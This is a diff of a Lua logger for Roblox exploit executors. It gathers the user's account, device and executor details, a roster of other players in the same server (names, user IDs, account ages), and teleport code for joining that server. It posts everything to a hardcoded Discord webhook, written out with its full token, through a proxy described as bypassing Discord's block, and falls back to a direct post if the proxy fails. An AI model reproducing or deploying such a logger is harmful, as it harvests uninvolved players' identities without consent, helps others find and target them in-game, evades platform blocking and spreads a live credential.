@@ -1,5 +1,5 @@
 -- ==============================================================================
--- ðŸ“¡ TXR ROBUST LOGGER (SAFE SIZE & RATE-LIMIT PROOF) ðŸ“¡
+-- 📡 TXR ROBUST LOGGER (SAFE SIZE & RATE-LIMIT PROOF - FIXED) 📡
 -- ==============================================================================
 
 local Players = game:GetService("Players")
@@ -8,7 +8,9 @@ local StarterGui = game:GetService("StarterGui")
 local UserInputService = game:GetService("UserInputService")
 local lp = Players.LocalPlayer
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1541722782310604820/L3kjYivqBHkOtU5HZJj7pNFJGyHkBHBaVZPg0AY-QBAJFf_SG3cu8TEcMaRjUuRTiyD1"
+-- Discord block bypass proxy
+local ORIGINAL_URL = "https://discord.com/api/webhooks/1541722782310604820/L3kjYivqBHkOtU5HZJj7pNFJGyHkBHBaVZPg0AY-QBAJFf_SG3cu8TEcMaRjUuRTiyD1"
+local WEBHOOK_URL = ORIGINAL_URL:gsub("https://discord.com", "https://webhook.lewisakura.moe")
 local TRACKER_FILE = "TXR_Tracker_Data.json"
 
 local function sendNotification(title, text)
@@ -45,9 +47,7 @@ task.spawn(function()
         end)
     end
 
-    local daysCount = math.floor((os.time() - trackerData.FirstSeen) / 86400)
-
-    -- Device & Platform
+    -- Device & Platform Detection
     local myDevice = "PC"
     if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
         myDevice = "Mobile"
@@ -56,81 +56,60 @@ task.spawn(function()
     end
 
     -- Fast Executor Detection
-    local executorName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Executor"
+    local executorName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown Executor"
 
     -- Ping
     local pingMs = "N/A"
-    pcall(function() pingMs = math.floor(lp:GetNetworkPing() * 1000) .. "ms" end)
+    pcall(function() 
+        pingMs = math.floor(lp:GetNetworkPing() * 1000) .. "ms" 
+    end)
 
-    -- Roster Generator (Compact 2-Line Format)
+    -- Compact Roster Generator (Safe 1024-Char Bounds)
     local allPlayers = Players:GetPlayers()
     local totalCount = #allPlayers
-    local rosterChunks = {}
-    local currentChunk = ""
+    local rosterSummary = ""
+    local maxDisplay = math.min(totalCount, 15) -- Max 15 to strictly prevent Embed limit crash
 
-    for idx, p in ipairs(allPlayers) do
+    for i = 1, maxDisplay do
+        local p = allPlayers[i]
         local pAge = p.AccountAge or 0
-        local pPrem = (p.MembershipType == Enum.MembershipType.Premium) and "â­" or "âŒ"
-        
-        -- In-game pass check
-        local tag = "None"
-        if p.Character then
-            for _, v in ipairs(p.Character:GetDescendants()) do
-                if v:IsA("TextLabel") then
-                    local t = string.lower(v.Text or "")
-                    if string.find(t, "vip") then tag = "VIP ðŸ‘‘"; break end
-                    if string.find(t, "premium") then tag = "Prem ðŸŒŸ"; break end
-                end
-            end
-        end
-
-        local entry = string.format("[%d] %s (@%s) | ID: %d | Age: %dd | Prem: %s | Pass: %s\n", idx, p.DisplayName, p.Name, p.UserId, pAge, pPrem, tag)
-
-        if #currentChunk + #entry > 900 then
-            table.insert(rosterChunks, currentChunk)
-            currentChunk = entry
-        else
-            currentChunk = currentChunk .. entry
-        end
+        local pPrem = (p.MembershipType == Enum.MembershipType.Premium) and "★" or "-"
+        rosterSummary = rosterSummary .. string.format("[%d] %s (@%s) | ID: %d | Age: %dd | Prem: %s\n", i, p.DisplayName, p.Name, p.UserId, pAge, pPrem)
     end
 
-    if #currentChunk > 0 then
-        table.insert(rosterChunks, currentChunk)
+    if totalCount > 15 then
+        rosterSummary = rosterSummary .. string.format("... and %d more players.", totalCount - 15)
     end
 
     local fieldsList = {
         {
-            ["name"] = "ðŸ‘¤ User & Client Info",
+            ["name"] = "👤 User & Client Info",
             ["value"] = string.format("**User:** %s (@%s)\n**ID:** `%d` | **Age:** %d Days\n**Device:** %s | **Executor:** `%s`\n**Ping:** %s | **Total Loads:** %d", lp.DisplayName, lp.Name, lp.UserId, lp.AccountAge, myDevice, executorName, pingMs, trackerData.Executions),
             ["inline"] = false
         },
         {
-            ["name"] = "ðŸŒ Server Info",
+            ["name"] = "🌐 Server Info",
             ["value"] = string.format("**Place ID:** `%s`\n**Job ID:** `%s`\n**Online Players:** %d", tostring(game.PlaceId), (game.JobId ~= "" and game.JobId or "N/A"), totalCount),
+            ["inline"] = false
+        },
+        {
+            ["name"] = string.format("👥 Server Players (%d)", totalCount),
+            ["value"] = "```yaml\n" .. (rosterSummary ~= "" and rosterSummary or "No players found") .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "⚡ Direct Teleport Code",
+            ["value"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "', game.Players.LocalPlayer)\n```",
             ["inline"] = false
         }
     }
-
-    for i, chunk in ipairs(rosterChunks) do
-        table.insert(fieldsList, {
-            ["name"] = string.format("ðŸ‘¥ Players List (%d/%d)", i, #rosterChunks),
-            ["value"] = "```yaml\n" .. chunk .. "```",
-            ["inline"] = false
-        })
-    end
-
-    table.insert(fieldsList, {
-        ["name"] = "âš¡ Direct Teleport Code",
-        ["value"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "', game.Players.LocalPlayer)\n```",
-        ["inline"] = false
-    })
 
     local webhookPayload = {
         ["username"] = "TXR TELEMETRY",
         ["avatar_url"] = "https://i.imgur.com/8N4kHwF.png",
         ["embeds"] = {
             {
-                ["title"] = "ðŸš¨ SCRIPT EXECUTION LOG ðŸš¨",
+                ["title"] = "🚨 SCRIPT EXECUTION LOG 🚨",
                 ["color"] = 65535,
                 ["fields"] = fieldsList,
                 ["footer"] = {
@@ -156,10 +135,23 @@ task.spawn(function()
         end)
 
         if success and res and (res.StatusCode == 200 or res.StatusCode == 204) then
-            sendNotification("TXR Logger", "âœ… Logs sent to Discord!")
+            sendNotification("TXR Logger", "✅ Logs sent to Discord!")
         else
-            local errCode = res and res.StatusCode or "Failed"
-            sendNotification("TXR Logger", "âš ï¸ Response: " .. tostring(errCode))
+            -- Backup Direct Call if Proxy fails
+            pcall(function()
+                requestFunc({
+                    Url = ORIGINAL_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode(webhookPayload)
+                })
+            end)
+            local code = res and res.StatusCode or "Err"
+            sendNotification("TXR Logger", "⚠️ Response: " .. tostring(code))
         end
+    else
+        sendNotification("TXR Logger", "❌ Executor lacks HTTP Request capability.")
     end
 end)
